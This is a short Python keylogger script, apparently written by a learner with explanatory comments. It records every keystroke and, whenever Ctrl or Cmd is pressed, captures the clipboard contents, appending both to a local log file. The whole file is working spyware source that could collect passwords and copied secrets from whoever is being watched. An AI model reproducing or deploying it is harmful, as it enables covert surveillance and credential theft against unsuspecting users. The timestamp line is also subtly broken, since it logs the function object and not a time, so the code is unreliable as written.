import pyperclip

from pynput.keyboard import Listener
from datetime import datetime

logger = './logs/logger.log'

def log_key(key):
    key = str(key).replace("'","") # turns key object into a string ('w') and removes quotes
    press_time = str(datetime.now)

    if key == 'Key.cmd' or key == "Key.ctrl": #if the key is the command key (mac) or control key (windows)
        line = f"{press_time}: Clipboard - {pyperclip.paste()}" # f"" is a formatted string
    else: #key is a regular key
        line = f"{press_time}: Key stroke - {key}"

    with open(logger, 'a') as f: # 'a' is append mode for the file
        f.write(f"{line}\n") #writing a formatted string of the line and the endline character so the next line added is on a newline in the logger

def start():
    with Listener(on_press = log_key) as l:
        l.join()

if __name__ == "__main__":
    start()